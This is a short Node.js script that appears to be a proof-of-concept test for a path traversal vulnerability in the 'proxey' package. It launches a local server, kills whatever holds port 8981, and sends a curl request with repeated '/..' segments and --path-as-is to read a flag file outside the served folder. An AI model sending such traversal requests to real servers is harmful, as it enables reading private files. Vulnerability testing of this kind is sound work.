const path = require("path");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in proxey", (done) => {
//   expect.assertions(1);
  const pkg = require("proxey");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8981/tcp", () => {});
  } catch (e) {}
  pkg.run({
    rootFolder: "./",
    port: 8981,
    proxyUrl: "/proxy",
    vars: { "X-Api-Token": "12345" },
    routes: {
      "/": "home.html",
      "/users": "users.html",
      "/api/users": "users.json",
    },
    charset: "utf-8",
  });
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8981${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });
